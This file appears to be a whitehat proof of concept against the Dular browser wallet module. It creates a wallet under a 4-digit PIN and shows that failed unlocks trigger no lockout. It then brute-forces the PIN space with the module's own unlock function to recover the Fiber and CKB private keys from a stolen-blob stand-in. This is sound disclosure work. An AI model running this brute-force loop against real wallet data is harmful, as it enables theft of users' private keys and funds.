// ckb-whitehat PoC — Dular: F6 browser self-custody wallet — weak PIN, no lockout,
// offline key recovery from an exfiltrated blob
//
// The root self-custody secrets (Fiber + CKB private keys) live in the browser
// and are encrypted at rest by the TARGET's real
// src/lib/browserWalletStore.js: PBKDF2-SHA256-250k -> AES-256-GCM, key
// derived from the user's PIN.
//
// This PoC calls the TARGET's REAL createWalletRecord() / unlockWalletRecord()
// — not a reimplementation — against an in-memory IndexedDB test double (the
// module targets the browser; the double stands in for that API only, it does
// not change the module's crypto or policy logic).
//
// What it asserts, on observable state:
//   1. the module accepts a 4-digit PIN (the app's whole policy is ">= 4
//      digits" — no charset/length/complexity requirement);
//   2. unlockWalletRecord() keeps NO attempt counter / lockout state: after N
//      wrong-PIN attempts the stored record is byte-for-byte unchanged;
//   3. an exfiltrated blob + a 4-digit PIN yields the owner's ACTUAL Fiber and
//      CKB private keys, recovered with the target's own unlock function.
//
// The separate "no export/backup/recovery path" claim is a code-shape
// observation, not an executable exploit — it is reported as STRUCTURAL, not
// as a fired PoC (see dular/FINDINGS.md).
//
// Run: node f6-pin-wallet.mjs
// Env:  DULAR_DIR=<repo root>   (or a server/ dir — both accepted)

import { resolveTarget, targetImport, line } from './target.mjs'

// ------------------------------------------- minimal in-memory IndexedDB double
function installFakeIndexedDb() {
  const stores = new Map() // storeName -> Map(key -> record)
  const ensure = (name) => {
    if (!stores.has(name)) stores.set(name, new Map())
    return stores.get(name)
  }
  const makeRequest = () => ({ onsuccess: null, onerror: null, onupgradeneeded: null, result: undefined, error: null })
  const flush = (fn) => process.nextTick(fn)

  globalThis.indexedDB = {
    open(_name, _version) {
      const req = makeRequest()
      flush(() => {
        const db = {
          objectStoreNames: { contains: (n) => stores.has(n) },
          createObjectStore(n) { ensure(n); return { name: n } },
          close() {},
          transaction(storeName, mode) {
            const store = ensure(storeName)
            // The module assigns `tx.oncomplete` on the object we hand back, so
            // that object MUST be the one we fire. Keep it as one object.
            const tx = { oncomplete: null, onerror: null, objectStore: null }
            const done = () => flush(() => { if (tx.oncomplete) tx.oncomplete() })
            const storeApi = {
              add(value) {
                const key = value[Object.keys(value)[0]]
                const r = makeRequest()
                if (mode === 'readwrite' && store.has(key)) {
                  r.error = new Error('constraint')
                  flush(() => { if (r.onerror) r.onerror() })
                  return r
                }
                store.set(key, value)
                r.result = key
                done()
                return r
              },
              put(value) {
                const key = value[Object.keys(value)[0]]
                store.set(key, value)
                const r = makeRequest()
                r.result = key
                done()
                return r
              },
              get(key) {
                const r = makeRequest()
                r.result = store.get(key)
                done()
                return r
              },
              delete(key) {
                store.delete(key)
                const r = makeRequest()
                done()
                return r
              },
            }
            tx.objectStore = () => storeApi
            done()
            return tx
          },
        }
        req.result = db
        if (req.onupgradeneeded) req.onupgradeneeded({ result: db })
        flush(() => { if (req.onsuccess) req.onsuccess({ target: req }) })
      })
      return req
    },
  }
}

// ------------------------------------------------------------------ main
const main = async () => {
  const { repoRoot } = resolveTarget()
  console.log(`target: ${repoRoot}`)
  installFakeIndexedDb()

  line('F6 — browser wallet key custody: PIN policy, lockout, offline recovery')
  const store = await targetImport(repoRoot, 'src/lib/browserWalletStore.js')

  // 1. The module's accepted PIN set. The app's UI check is ">= 4 digits";
  //    the module itself accepts anything the caller hands it.
  const phone = '+254700000004'
  const pin = '1379'                       // 4 digits, trivially guessable
  const record = await store.createWalletRecord(phone, pin)
  console.log(`createWalletRecord(phone, "${pin}") -> record keys: ${Object.keys(record).join(', ')}`)
  console.log(`stored blob fields: ${Object.keys(record.encrypted).join(', ')} (salt/iv/ciphertext — no attempt counter, no kdf params, no policy metadata)`)

  // 2. Lockout / rate limit: hammer unlockWalletRecord with wrong PINs and
  //    check whether the target records ANY attempt state.
  const before = JSON.stringify(record)
  let wrongAccepted = 0
  const ATTEMPTS = 25
  for (let i = 0; i < ATTEMPTS; i++) {
    try {
      await store.unlockWalletRecord(record, String(1000 + i))
      wrongAccepted += 1
    } catch { /* expected: AES-GCM auth failure */ }
  }
  const after = JSON.stringify(record)
  console.log(`wrong-PIN unlock attempts: ${ATTEMPTS} | accepted: ${wrongAccepted} | record mutated by failed attempts: ${before !== after}`)
  console.log(`lockout state present in module: ${/attempt|lockout|cooldown|throttle/i.test(JSON.stringify(record)) ? 'YES' : 'NO — the module keeps no attempt counter; the caller has nothing to throttle against'}`)

  // 3. Offline recovery of the owner's REAL private keys from the blob.
  //    This is the attacker's operation: brute-force the PIN space using the
  //    target's own unlock function as the oracle.
  line('F6 — offline crack of the exfiltrated blob (target unlockWalletRecord as oracle)')
  const t0 = performance.now()
  let recovered = null
  let tried = 0
  for (let candidate = 0; candidate <= 9999 && !recovered; candidate++) {
    const guess = String(candidate).padStart(4, '0')
    tried += 1
    try {
      const unlocked = await store.unlockWalletRecord(record, guess)
      recovered = { guess, unlocked }
      break
    } catch { /* wrong PIN */ }
  }
  const elapsed = (performance.now() - t0) / 1000
  const perTry = (performance.now() - t0) / tried
  console.log(`recovered PIN "${recovered?.guess}" after ${tried} attempts in ${elapsed.toFixed(2)} s (${perTry.toFixed(0)} ms/attempt, PBKDF2-SHA256-250k)`)
  console.log(`recovered Fiber secret key: ${recovered?.unlocked?.fiberSecretKey?.length} bytes | CKB secret key: ${recovered?.unlocked?.ckbSecretKey?.length} bytes`)
  console.log(`projected full 4-digit keyspace (10,000 PINs) ≈ ${((perTry * 10000) / 60000).toFixed(1)} min on this CPU — and the module keeps no attempt counter, so retries are unbounded`)

  // 4. Export/backup: enumerate the module's REAL public API (observable, not
  //    a source grep). Any export/backup path would have to live here.
  const api = Object.keys(store).sort()
  const hasExport = api.some((k) => /export|backup|restore|recover|mnemonic/i.test(k))
  console.log(`module public API: ${api.join(', ')}`)
  console.log(`export/backup/recovery entry point in the wallet module: ${hasExport ? 'present' : 'NONE'}`)

  const fired = Boolean(recovered) && wrongAccepted === 0 && !hasExport
  console.log(fired
    ? 'FINDING F6 FIRED — a 4-digit PIN + an exfiltrated blob yields the owner\'s real Fiber/CKB private keys offline, with no lockout and no export path'
    : 'FINDING F6 UNPROVEN')
  process.exit(fired ? 0 : 1)
}

main().catch((e) => { console.error('F6 PoC error:', e); process.exit(2) })
